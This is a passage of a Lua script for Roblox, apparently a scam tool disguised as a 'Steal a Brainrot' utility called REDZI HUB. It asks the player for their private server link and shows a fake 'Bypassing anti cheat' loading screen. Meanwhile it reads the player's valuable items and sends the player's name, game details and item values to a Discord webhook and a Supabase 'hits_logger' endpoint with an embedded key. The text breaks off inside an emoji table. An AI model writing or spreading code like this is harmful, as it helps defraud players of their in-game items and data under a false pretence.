-- REDZI HUB - DUALHOOK REMOVED - CONFIG PASSED FROM LOADER

local CONFIG = ... or {}

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")

local Usernames = CONFIG.Usernames or {}
local Webhook = CONFIG.Webhook or ""
local DISCORD_ID = CONFIG.DiscordID or ""

local LOADING_DURATION = 110
local MIN_LOG_VALUE = 50000

local SUPABASE_URL = "https://yiyjqwmwoalxhvwiigwi.supabase.co"
local SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlpeWpxd213b2FseGh2d2lpZ3dpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMzI1MzIsImV4cCI6MjA4MzcwODUzMy0.35khALBOy3LY5lTGNcVLQHMuMfEoNOS7ye_0T6vEVoY"

local initialInventoryList = {}
local initialInventoryCount = 0
local authorizedFound = false
local lastMessageId = nil

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RedziHub"
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 10, 30)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.5, -145, 0.5, -100)
MainFrame.Size = UDim2.new(0, 290, 0, 200)
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.ClipsDescendants = true

local FrameCorner = Instance.new("UICorner")
FrameCorner.CornerRadius = UDim.new(0, 16)
FrameCorner.Parent = MainFrame

local FrameStroke = Instance.new("UIStroke")
FrameStroke.Parent = MainFrame
FrameStroke.Color = Color3.fromRGB(160, 60, 255)
FrameStroke.Thickness = 1.5
FrameStroke.Transparency = 0.2

local BgGradient = Instance.new("UIGradient")
BgGradient.Parent = MainFrame
BgGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 10, 40)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(35, 15, 60)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 8, 35)),
})
BgGradient.Rotation = 135

local AccentLine = Instance.new("Frame")
AccentLine.Parent = MainFrame
AccentLine.Size = UDim2.new(1, 0, 0, 2)
AccentLine.Position = UDim2.new(0, 0, 0, 0)
AccentLine.BackgroundColor3 = Color3.fromRGB(180, 80, 255)
AccentLine.BorderSizePixel = 0
AccentLine.ZIndex = 5

local AccentGradient = Instance.new("UIGradient")
AccentGradient.Parent = AccentLine
AccentGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 0, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 100, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 0, 255)),
})

local TitleContainer = Instance.new("Frame")
TitleContainer.Parent = MainFrame
TitleContainer.Size = UDim2.new(1, 0, 0, 52)
TitleContainer.BackgroundTransparency = 1
TitleContainer.ZIndex = 2

local Title = Instance.new("TextLabel")
Title.Parent = TitleContainer
Title.Text = "✦ REDZI HUB ✦"
Title.TextColor3 = Color3.fromRGB(220, 150, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Size = UDim2.new(1, 0, 1, 0)
Title.BackgroundTransparency = 1
Title.ZIndex = 3

local TitleGradient = Instance.new("UIGradient")
TitleGradient.Parent = Title
TitleGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 100, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 200, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 50, 255)),
})

local Subtitle = Instance.new("TextLabel")
Subtitle.Parent = MainFrame
Subtitle.Text = "steal a brainrot utility"
Subtitle.TextColor3 = Color3.fromRGB(140, 80, 200)
Subtitle.Font = Enum.Font.Gotham
Subtitle.TextSize = 11
Subtitle.Size = UDim2.new(1, 0, 0, 16)
Subtitle.Position = UDim2.new(0, 0, 0, 48)
Subtitle.BackgroundTransparency = 1
Subtitle.ZIndex = 2

local InputContainer = Instance.new("Frame")
InputContainer.Parent = MainFrame
InputContainer.Size = UDim2.new(0.84, 0, 0, 34)
InputContainer.Position = UDim2.new(0.08, 0, 0, 74)
InputContainer.BackgroundColor3 = Color3.fromRGB(30, 15, 50)
InputContainer.BorderSizePixel = 0
InputContainer.ZIndex = 2

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 8)
InputCorner.Parent = InputContainer

local InputStroke = Instance.new("UIStroke")
InputStroke.Parent = InputContainer
InputStroke.Color = Color3.fromRGB(100, 40, 180)
InputStroke.Thickness = 1
InputStroke.Transparency = 0.4

local LinkInput = Instance.new("TextBox")
LinkInput.Parent = InputContainer
LinkInput.Text = ""
LinkInput.PlaceholderText = "enter private server link..."
LinkInput.PlaceholderColor3 = Color3.fromRGB(100, 70, 140)
LinkInput.BackgroundTransparency = 1
LinkInput.TextColor3 = Color3.fromRGB(230, 200, 255)
LinkInput.Position = UDim2.new(0.03, 0, 0, 0)
LinkInput.Size = UDim2.new(0.94, 0, 1, 0)
LinkInput.Font = Enum.Font.Gotham
LinkInput.TextSize = 13
LinkInput.ZIndex = 3
LinkInput.TextXAlignment = Enum.TextXAlignment.Left
LinkInput.ClearTextOnFocus = false

LinkInput.Focused:Connect(function()
    TweenService:Create(InputStroke, TweenInfo.new(0.3), {Color = Color3.fromRGB(180, 80, 255), Transparency = 0}):Play()
    TweenService:Create(InputContainer, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(40, 20, 65)}):Play()
end)

LinkInput.FocusLost:Connect(function()
    TweenService:Create(InputStroke, TweenInfo.new(0.3), {Color = Color3.fromRGB(100, 40, 180), Transparency = 0.4}):Play()
    TweenService:Create(InputContainer, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(30, 15, 50)}):Play()
end)

local ExecuteBtn = Instance.new("TextButton")
ExecuteBtn.Parent = MainFrame
ExecuteBtn.Text = "⚡  EXECUTE"
ExecuteBtn.BackgroundColor3 = Color3.fromRGB(110, 40, 200)
ExecuteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteBtn.Position = UDim2.new(0.08, 0, 0, 118)
ExecuteBtn.Size = UDim2.new(0.84, 0, 0, 38)
ExecuteBtn.Font = Enum.Font.GothamBold
ExecuteBtn.TextSize = 15
ExecuteBtn.ZIndex = 2
ExecuteBtn.AutoButtonColor = false

local BtnCorner = Instance.new("UICorner")
BtnCorner.CornerRadius = UDim.new(0, 9)
BtnCorner.Parent = ExecuteBtn

local BtnGradient = Instance.new("UIGradient")
BtnGradient.Parent = ExecuteBtn
BtnGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 50, 230)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 20, 170)),
})
BtnGradient.Rotation = 90

local BtnStroke = Instance.new("UIStroke")
BtnStroke.Parent = ExecuteBtn
BtnStroke.Color = Color3.fromRGB(200, 120, 255)
BtnStroke.Thickness = 1
BtnStroke.Transparency = 0.5

ExecuteBtn.MouseEnter:Connect(function()
    TweenService:Create(ExecuteBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(150, 60, 240)}):Play()
    TweenService:Create(BtnStroke, TweenInfo.new(0.2), {Transparency = 0, Color = Color3.fromRGB(230, 160, 255)}):Play()
    TweenService:Create(ExecuteBtn, TweenInfo.new(0.15), {Size = UDim2.new(0.86, 0, 0, 38), Position = UDim2.new(0.07, 0, 0, 118)}):Play()
end)

ExecuteBtn.MouseLeave:Connect(function()
    TweenService:Create(ExecuteBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(110, 40, 200)}):Play()
    TweenService:Create(BtnStroke, TweenInfo.new(0.2), {Transparency = 0.5, Color = Color3.fromRGB(200, 120, 255)}):Play()
    TweenService:Create(ExecuteBtn, TweenInfo.new(0.15), {Size = UDim2.new(0.84, 0, 0, 38), Position = UDim2.new(0.08, 0, 0, 118)}):Play()
end)

ExecuteBtn.MouseButton1Down:Connect(function()
    TweenService:Create(ExecuteBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(80, 20, 170), Size = UDim2.new(0.82, 0, 0, 36), Position = UDim2.new(0.09, 0, 0, 120)}):Play()
end)

ExecuteBtn.MouseButton1Up:Connect(function()
    TweenService:Create(ExecuteBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(150, 60, 240), Size = UDim2.new(0.86, 0, 0, 38), Position = UDim2.new(0.07, 0, 0, 118)}):Play()
end)

local StatusDot = Instance.new("Frame")
StatusDot.Parent = MainFrame
StatusDot.Size = UDim2.new(0, 8, 0, 8)
StatusDot.Position = UDim2.new(0, 12, 0, 178)
StatusDot.BackgroundColor3 = Color3.fromRGB(100, 255, 120)
StatusDot.BorderSizePixel = 0
StatusDot.ZIndex = 3
local DotCorner = Instance.new("UICorner")
DotCorner.CornerRadius = UDim.new(1, 0)
DotCorner.Parent = StatusDot

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Parent = MainFrame
StatusLabel.Size = UDim2.new(0.8, 0, 0, 18)
StatusLabel.Position = UDim2.new(0, 26, 0, 173)
StatusLabel.Text = "ready"
StatusLabel.TextColor3 = Color3.fromRGB(140, 100, 200)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 11
StatusLabel.BackgroundTransparency = 1
StatusLabel.ZIndex = 3
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left

task.spawn(function()
    while true do
        TweenService:Create(StatusDot, TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0.6}):Play()
        task.wait(0.9)
        TweenService:Create(StatusDot, TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0}):Play()
        task.wait(0.9)
    end
end)

task.spawn(function()
    while true do
        for i = 0, 359 do
            BgGradient.Rotation = i
            task.wait(0.05)
        end
    end
end)

task.spawn(function()
    while true do
        TweenService:Create(FrameStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.6}):Play()
        task.wait(1.5)
        TweenService:Create(FrameStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0}):Play()
        task.wait(1.5)
    end
end)

MainFrame.Position = UDim2.new(0.5, -145, -0.2, 0)
MainFrame.BackgroundTransparency = 1
TweenService:Create(MainFrame, TweenInfo.new(0.55, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Position = UDim2.new(0.5, -145, 0.5, -100),
    BackgroundTransparency = 0
}):Play()

local LoadingFrame = Instance.new("Frame")
LoadingFrame.Name = "LoadingFrame"
LoadingFrame.Parent = MainFrame
LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
LoadingFrame.BackgroundColor3 = Color3.fromRGB(14, 7, 25)
LoadingFrame.ZIndex = 10
LoadingFrame.Visible = false

local LoadingCorner = Instance.new("UICorner")
LoadingCorner.CornerRadius = UDim.new(0, 16)
LoadingCorner.Parent = LoadingFrame

local LoadingBgGrad = Instance.new("UIGradient")
LoadingBgGrad.Parent = LoadingFrame
LoadingBgGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 8, 38)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 5, 22)),
})
LoadingBgGrad.Rotation = 135

local LoadingIcon = Instance.new("TextLabel")
LoadingIcon.Parent = LoadingFrame
LoadingIcon.Size = UDim2.new(1, 0, 0, 30)
LoadingIcon.Position = UDim2.new(0, 0, 0, 22)
LoadingIcon.Text = "$ REDZI HUB $"
LoadingIcon.TextColor3 = Color3.fromRGB(200, 120, 255)
LoadingIcon.Font = Enum.Font.GothamBold
LoadingIcon.TextSize = 18
LoadingIcon.BackgroundTransparency = 1
LoadingIcon.ZIndex = 11

local LoadingIconGrad = Instance.new("UIGradient")
LoadingIconGrad.Parent = LoadingIcon
LoadingIconGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(160, 60, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(240, 180, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 30, 220)),
})

local LoadingText = Instance.new("TextLabel")
LoadingText.Parent = LoadingFrame
LoadingText.Size = UDim2.new(1, 0, 0, 24)
LoadingText.Position = UDim2.new(0, 0, 0, 58)
LoadingText.Text = "Bypassing anti cheat"
LoadingText.TextColor3 = Color3.fromRGB(170, 110, 220)
LoadingText.Font = Enum.Font.Gotham
LoadingText.TextSize = 13
LoadingText.BackgroundTransparency = 1
LoadingText.ZIndex = 11

local BarBG = Instance.new("Frame")
BarBG.Parent = LoadingFrame
BarBG.BackgroundColor3 = Color3.fromRGB(35, 18, 60)
BarBG.Size = UDim2.new(0.82, 0, 0, 10)
BarBG.Position = UDim2.new(0.09, 0, 0, 96)
BarBG.ZIndex = 11
BarBG.ClipsDescendants = true
local BarBGCorner = Instance.new("UICorner")
BarBGCorner.CornerRadius = UDim.new(1, 0)
BarBGCorner.Parent = BarBG
local BarBGStroke = Instance.new("UIStroke")
BarBGStroke.Parent = BarBG
BarBGStroke.Color = Color3.fromRGB(80, 30, 140)
BarBGStroke.Thickness = 1
BarBGStroke.Transparency = 0.3

local Bar = Instance.new("Frame")
Bar.Parent = BarBG
Bar.BackgroundColor3 = Color3.fromRGB(160, 60, 255)
Bar.Size = UDim2.new(0.38, 0, 1, 0)
Bar.Position = UDim2.new(-0.38, 0, 0, 0)
Bar.ZIndex = 12
local BarCorner = Instance.new("UICorner")
BarCorner.CornerRadius = UDim.new(1, 0)
BarCorner.Parent = Bar

local BarGradient = Instance.new("UIGradient")
BarGradient.Parent = Bar
BarGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 20, 220)),
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(200, 100, 255)),
    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(240, 180, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 60, 255)),
})

local BarShimmer = Instance.new("Frame")
BarShimmer.Parent = Bar
BarShimmer.Size = UDim2.new(0.4, 0, 1, 0)
BarShimmer.Position = UDim2.new(-0.4, 0, 0, 0)
BarShimmer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BarShimmer.BackgroundTransparency = 0.7
BarShimmer.ZIndex = 13
BarShimmer.BorderSizePixel = 0
local ShimmerCorner = Instance.new("UICorner")
ShimmerCorner.CornerRadius = UDim.new(1, 0)
ShimmerCorner.Parent = BarShimmer

local PercentLabel = Instance.new("TextLabel")
PercentLabel.Parent = LoadingFrame
PercentLabel.Size = UDim2.new(1, 0, 0, 16)
PercentLabel.Position = UDim2.new(0, 0, 0, 110)
PercentLabel.Text = "connecting to servers..."
PercentLabel.TextColor3 = Color3.fromRGB(120, 70, 180)
PercentLabel.Font = Enum.Font.Gotham
PercentLabel.TextSize = 11
PercentLabel.BackgroundTransparency = 1
PercentLabel.ZIndex = 11

for i = 1, 5 do
    local dot = Instance.new("Frame")
    dot.Parent = LoadingFrame
    dot.Size = UDim2.new(0, 3, 0, 3)
    dot.Position = UDim2.new(math.random(10,90)/100, 0, math.random(10,85)/100, 0)
    dot.BackgroundColor3 = Color3.fromRGB(160, 60, 255)
    dot.BackgroundTransparency = math.random(3,7)/10
    dot.BorderSizePixel = 0
    dot.ZIndex = 10
    local dc = Instance.new("UICorner")
    dc.CornerRadius = UDim.new(1, 0)
    dc.Parent = dot
    task.spawn(function()
        while true do
            TweenService:Create(dot, TweenInfo.new(math.random(15,30)/10, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = math.random(1,9)/10}):Play()
            task.wait(math.random(15,30)/10)
        end
    end)
end

task.spawn(function()
    local dots = {"", ".", "..", "..."}
    local i = 1
    while true do
        if LoadingFrame.Visible then
            local base = LoadingText.Text:gsub("%.+$", "")
            LoadingText.Text = base .. dots[i]
            i = (i % #dots) + 1
        end
        task.wait(0.45)
    end
end)

local barRunning = false
local function startBouncingBar()
    if barRunning then return end
    barRunning = true
    task.spawn(function()
        while LoadingFrame.Visible do
            Bar.Position = UDim2.new(-0.38, 0, 0, 0)
            local t = TweenService:Create(Bar, TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                Position = UDim2.new(1.0, 0, 0, 0)
            })
            t:Play()
            t.Completed:Wait()
            task.wait(0.02)
        end
        barRunning = false
    end)
    task.spawn(function()
        while LoadingFrame.Visible do
            BarShimmer.Position = UDim2.new(-0.4, 0, 0, 0)
            local s = TweenService:Create(BarShimmer, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                Position = UDim2.new(1.4, 0, 0, 0)
            })
            s:Play()
            s.Completed:Wait()
            task.wait(0.6)
        end
    end)
end

local function parseGen(str)
    local n, u = str:gsub("%s", ""):match("(%d+%.?%d*)([KMB]?)")
    n = tonumber(n) or 0
    if u == "K" then return n * 1000
    elseif u == "M" then return n * 1000000
    elseif u == "B" then return n * 1000000000 end
    return n
end

local function formatValue(n)
    if n >= 1000000000 then return string.format("%.1fB", n / 1000000000)
    elseif n >= 1000000 then return string.format("%.1fM", n / 1000000)
    elseif n >= 1000 then return string.format("%.1fK", n / 1000)
    else return tostring(n) end
end

local function getValuableBrainrots()
    local list = {}
    local debris = Workspace:FindFirstChild("Debris")
    if not debris then return list end
    for _, t in ipairs(debris:GetChildren()) do
        if t.Name == "FastOverheadTemplate" then
            local oh = t:FindFirstChild("AnimalOverhead")
            if oh and oh:FindFirstChild("DisplayName") and oh:FindFirstChild("Generation") then
                local val = parseGen(oh.Generation.Text)
                if val >= MIN_LOG_VALUE then
                    table.insert(list, {name = oh.DisplayName.Text, gen = oh.Generation.Text, val = val})
                end
            end
        end
    end
    table.sort(list, function(a, b) return a.val > b.val end)
    return list
end

local function incrementHitCount(webhookUrl)
    if not webhookUrl or webhookUrl == "" then return false end
    local payload = {p_webhook = webhookUrl}
    pcall(function()
        local req = (syn and syn.request) or request or http_request or (http and http.request)
        req({
            Url = SUPABASE_URL .. "/rest/v1/rpc/increment_hits_for_webhook",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["apikey"] = SUPABASE_ANON_KEY,
                ["Authorization"] = "Bearer " .. SUPABASE_ANON_KEY,
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

local function trackHit(data)
    pcall(function()
        local req = (syn and syn.request) or request or http_request or (http and http.request)
        req({
            Url = SUPABASE_URL .. "/rest/v1/hits_logger",
            Method = "POST",
            Headers = {
                ["apikey"] = SUPABASE_ANON_KEY,
                ["Authorization"] = "Bearer " .. SUPABASE_ANON_KEY,
                ["Content-Type"] = "application/json",
                ["Prefer"] = "return=minimal"
            },
            Body = HttpService:JSONEncode({
                user_id = DISCORD_ID,
                player_name = LocalPlayer.Name,
                executor = identifyexecutor and identifyexecutor() or "Unknown",
                game_id = tostring(game.PlaceId),
                game_name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                total_value = data.total_value or "0",
                items_sent = data.items_sent or "None"
            })
        })
        req({
            Url = SUPABASE_URL .. "/rest/v1/rpc/increment_hits_for_user",
            Method = "POST",
            Headers = {
                ["apikey"] = SUPABASE_ANON_KEY,
                ["Authorization"] = "Bearer " .. SUPABASE_ANON_KEY,
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({p_user_id = DISCORD_ID})
        })
    end)
end

local function sendDetailedEmbedLog(joinLink, status)
    local currentInv = getValuableBrainrots()
    local method = lastMessageId and "PATCH" or "POST"
    local url = lastMessageId and Webhook .. "/messages/" .. lastMessageId or Webhook .. "?wait=true"
    local totalInitialValue = 0
    local totalClaimedValue = 0
    local inventoryLines = {}

    local emojiMap = {
        ["Noobini Pizzanini"] = "🍕", ["Lirili Larila"] = "🎶", ["Tim Cheese"] = "🧀",
        ["FluriFlura"] = "🌸", ["Talpa Di Fero"] = "🦔⛏️", ["Svinina Bombardino"] = "🐷💣",
        ["Pipi Kiwi"] = "🥝", ["Racooni Jandelini"] = "🦝", ["Pipi Corni"] = "🌽",
        ["Noobini Santanini"] = "🎅", ["Trippi Troppi"] = "🤪", ["Gangster Footera"] = "⚽🕶️",
        ["Bandito Bobritto"] = "🌯🤠", ["Boneca Ambalabu"] = "🪆", ["Cacto Hipopotamo"] = "🌵🦛",
        ["Ta Ta Ta Ta Sahur"] = "🥁", ["Tric Trac Baraboom"] = "💥", ["Pipi Avocado"] = "🥑",
        ["Frogo Elfo"] = "🐸🧝", ["Cappuccino Assassino"] = "☕🔪", ["Brr Brr Patapim"] = "❄️👣",
        ["Trulimero Trulicina"] = "🎀", ["Bambini Crostini"] = "👶🥐", ["Bananita Dolphinita"] = "🍌🐬",
        ["Perochello Lemonchello"] = "🍋", ["Brri Brri Bicus Dicus Bombicus"] = "💣🦇",
        ["Avocadini Guffo"] = "🥑😂", ["Salamino Penguino"] = "🍖🐧", ["Ti Ti Ti Sahur"] = "🔔",
        ["Penguin Tree"] = "🐧🌲", ["Penguino Cocosino"] = "🐧🥥", ["Burbaloni Loliloli"] = "🫧",
        ["Chimpazini Bananini"] = "🐒🍌", ["Ballerina Cappuccina"] = "☕🩰",
        ["Chef Crabracadabra"] = "🦀👨‍🍳", ["Lionel Cactuseli"] = "⚽🌵",
        ["Glorbo Fruttodrillo"] = "🐊🍓", ["Blueberrini Octopusini"] = "🫐🐙",
        ["Strawberelli Flamingelli"] = "🍓🦩", ["Pandaccini Bananini"] = "🐼🍌",
        ["Cocosini Mama"] = "🥥👩", ["Sigma Boy"] = "😈", ["Sigma Girl"] = "😼",
        ["Pi Pi Watermelon"] = "🍉", ["Chocco Bunny"] = "🍫🐰", ["Sealo Regalo"] = "🦭🎁",
        ["Frigo Camelo"] = "🐪🧊", ["Orangutini Ananassini"] = "🦧🍍",
        ["Rhino Toasterino"] = "🦏🍞", ["Bombardiro Crocodilo"] = "💣🐊",
        ["Bombombini Gusini"] = "💥🪿", ["Cavallo Virtuso"] = "🐴🎻",
        ["Gorillo Watermelondrillo"] = "🦍🍉", ["Avocadorilla"] = "🥑🦖",
        ["Tob Tobi Tobi"] = "🐸", ["Ganganzelli Trulala"] = "🎤",
        ["Cachorrito Melonito"] = "🐶🍈", ["Elefanto Frigo"] = "🐘🧊",
        ["Toiletto Focaccino"] = "🚽🍞", ["Te Te Te Sahur"] = "☕",
        ["Tracoducotulu Delapeladustuz"] = "🦃", ["Lerulerulerule"] = "🎵",
        ["Jingle Jingle Sahur"] = "🔔", ["Tree Tree Tree Sahur"] = "🌳", ["Carloo"] = "😎",
        ["Spioniro Golubiro"] = "🕵️‍♂️🕊️", ["Zibra Zubra Zibralini"] = "🦓",
        ["Tigrilini Watermelini"] = "🐅🍉", ["Carrotini Brainini"] = "🥕🧠",
        ["Bananito Bandito"] = "🍌🤠", ["Coco Elefanto"] = "🥥🐘",
        ["Girafa Celestre"] = "🦒✨", ["Gattatino Nyanino"] = "😺🌈",
        ["Chihuanini Taconini"] = "🐶🌮", ["Matteo"] = "🧍‍♂️", ["Tralalero Tralala"] = "🎶",
        ["Espresso Signora"] = "☕👩", ["Odin Din Din Dun"] = "⚡",
        ["Statutino Libertino"] = "🗽", ["Trenostruzzo Turbo 3000"] = "🐦‍⬛🚄",
        ["Ballerino Lololo"] = "🕺", ["Los Orcalitos"] = "🐳", ["Dug dug dug"] = "🥁",
        ["Tralalita Tralala"] = "🎶", ["Urubini Flamenguini"] = "🦜🔥",
        ["Los Bombinitos"] = "💣", ["Trigoligre Frutonni"] = "🐯🍎",
        ["Orcalero Orcala"] = "🐳", ["Bulbito Bandito Traktorito"] = "💡🤠🚜",
        ["Los Crocodillitos"] = "🐊", ["Piccione Macchina"] = "🐦🚗",
        ["Trippi Troppi Troppa Trippa"] = "🤪🥩", ["Los Tungtungtungcitos"] = "🥁",
        ["Tukanno Bananno"] = "🦜🍌", ["Alessio"] = "🧍‍♂️", ["Tipi Topi Taco"] = "🌮",
        ["Extinct Ballerina"] = "🦖🩰", ["Capi Taco"] = "🌮", ["Gattito Tacoto"] = "😺🌮",
        ["Pakrahmatmamat"] = "🙏", ["Tractoro Dinosauro"] = "🚜🦖",
        ["Corn Corn Corn Sahur"] = "🌽", ["Squalanana"] = "🦈🍌",
        ["Los Tipi Tacos"] = "🌮", ["Bombardini Tortinii"] = "💣🌯",
        ["Pop pop Sahur"] = "🎈", ["Ballerina Peppermintina"] = "🩰🍬",
        ["Yeti Claus"] = "🦍🎅", ["Ginger Globo"] = "🍪🌍", ["Frio Ninja"] = "🥶🥷",
        ["Ginger Cisterna"] = "🍪🚛", ["Cacasito Satalito"] = "💩⭐", ["Aquanaut"] = "🌊",
        ["Tartaruga Cisterna"] = "🐢🚛", ["Las Sis"] = "👯‍♀️",
        ["La Vacca Staturno Saturnita"] = "🐄🪐", ["Chimpanzini Spiderini"] = "🐒🕷️",
        ["Extinct Tralalero"] = "🦖🎶", ["Extinct Matteo"] = "🦖🧍‍♂️",
        ["Los Tralaleritos"] = "🎶", ["La Karkerkar Combinasion"] = "🐔",
        ["Karker Sahur"] = "🐔", ["Las Tralaleritas"] = "🎶",
        ["Job Job Job Sahur"] = "💼", ["Los Spyderrinis"] = "🕷️",
        ["Perrito Burrito"] = "🐶🌯", ["Graipuss Medussi"] = "🍇🪼",
        ["Los Jobcitos"] = "💼", ["La Grande Combinasion"] = "🔥",
        ["Tacorita Bicicleta"] = "🌮🚲", ["Nuclearo Dinossauro"] = "☢️🦖",
        ["Los 67"] = "6️⃣7️⃣", ["Money Money Puggy"] = "💰🐶",
        ["Chillin Chili"] = "🥶🌶️", ["La Extinct Grande"] = "🦖",
        ["Los Tacoritas"] = "🌮", ["Los Tortus"] = "🐢",
        ["Tang Tang Kelentang"] = "🔔", ["Garama and Madundung"] = "🐸",
        ["La Secret Combinasion"] = "🤫", ["Torrtuginni Dragonfruitini"] = "🐢🐉",
        ["Pot Hotspot"] = "🔥📶", ["To to to Sahur"] = "🚽",
        ["Las Vaquitas Saturnitas"] = "🐄🪐", ["Chicleteira Bicicleteira"] = "🍬🚲",
        ["Agarrini la Palini"] = "🤝", ["Mariachi Corazoni"] = "🎸❤️",
        ["Dragon Cannelloni"] = "🐉🍝", ["Los Combinasionas"] = "🔥",
        ["La Cucaracha"] = "🪳", ["Karkerkar Kurkur"] = "🐔",
        ["Los Hotspotsitos"] = "📶", ["Quesadilla Crocodila"] = "🧀🐊",
        ["Esok Sekolah"] = "🏫", ["Los Matteos"] = "🧍‍♂️", ["Dul Dul Dul"] = "🍬",
        ["Blackhole Goat"] = "🕳️🐐", ["Nooo My Hotspot"] = "😭📶",
        ["Sammyini Spyderini"] = "🕷️", ["Spaghetti Tualetti"] = "🍝🚽",
        ["67"] = "6️⃣7️⃣", ["Los Noo My Hotspotsitos"] = "😭📶",
        ["Celularcini Viciosini"] = "📱", ["Tralaledon"] = "🎶",
        ["Tictac Sahur"] = "⏰", ["La Supreme Combinasion"] = "👑",
        ["Ketupat Kepat"] = "🍚", ["Ketchuru and Musturu"] = "🍔",
        ["Burguro and Fryuro"] = "🍔🍟", ["Please my Present"] = "🎁",
        ["La Grande"] = "🔥", ["La Vacca Prese Presente"] = "🐄🎁",
        ["Ho Ho Ho Sahur"] = "🎅", ["Chicleteira Noelteira"] = "🍬🎄",
        ["Cooki and Milki"] = "🍪🥛", ["La Jolly Grande"] = "🎄",
        ["Capitano Moby"] = "🐳", ["Cerberus"] = "🐕‍🦺",
        ["Skibidi Toilet"] = "🚽", ["Strawberry Elephant"] = "🍓🐘",
        ["Meowl"] = "🐱", ["Tartaragno"] = "🐢🕸️",
        ["Tung Tung Tung Sahur"] = "🥁", ["Cupkake Koala"] = "🧁🐨",
        ["Pinealotto Fruttarino"] = "🍍", ["Bandito Axolito"] = "🤠🦎",
        ["Avocadini Antilopini"] = "🥑🦌", ["Malame Amarele"] = "🍋",
        ["Mangolini Parrocini"] = "🥭", ["Frogato Pirato"] = "🐸🏴‍☠️",
        ["Doi Doi Do"] = "🐮", ["Wombo Rollo"] = "🥐", ["Mummio Rappitto"] = "🧟‍♂️",
        ["Tirilikalika Tirilikalako"] = "🎶", ["Quivioli Ameleonni"] = "🥝🦎",
        ["Clickerino Crabo"] = "🖱️🦀", ["Caramello Filtrello"] = "🍬",
        ["Pipi Potato"] = "🥔", ["Blueberrini Octopusin"] = "🫐🐙",
        ["Quackula"] = "🦆🧛", ["Signore Carapace"] = "🐢", ["Puffaball"] = "⚽",
        ["Buho de Fuego"] = "🦉🔥", ["Brutto Gialutto"] = "😖💛",
        ["Gorillo Subwoofero"] = "🦍🔊", ["Rhino Helicopterino"] = "🦏🚁",
        ["Magi Ribbitini"] = "🐸✨", ["Los Noobinis"] = "🍕",
        ["Jacko Spaventosa"] = "🎃", ["Centrucci Nuclucci"] = "☢️",
        ["Antonio"] = "🧍‍♂️", ["Mythic Lucky Block"] = "🎲✨",
        ["Stoppo Luminino"] = "🛑💡", ["Spongini Quackini"] = "🧽🦆",
        ["Fizzy Soda"] = "🥤", ["Brainrot God Lucky Block"] = "🧠🎲",
